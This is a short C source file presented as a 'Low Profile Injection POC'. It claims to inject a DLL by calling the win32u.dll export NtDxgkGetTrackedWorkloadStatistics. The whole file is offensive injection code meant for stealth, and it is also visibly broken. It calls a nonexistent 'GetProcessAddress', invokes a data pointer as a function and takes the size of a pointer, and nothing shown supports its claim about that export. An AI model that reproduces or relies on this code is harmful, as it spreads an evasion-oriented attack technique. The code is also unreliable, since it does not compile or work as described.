/*
  Low Profile Injection POC
*/

#include <windows.h>
void* CtlFunction = GetProcessAddress(LoadLibrary("win32u.dll"), "NtDxgkGetTrackedWorkloadStatistics");

#define _INJECTLIBRARY(lib, size) CtlFunction(lib, size)

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
    char* library = "dllname.dll";
    
    _INJECTLIBRARY(library, sizeof(library));
}
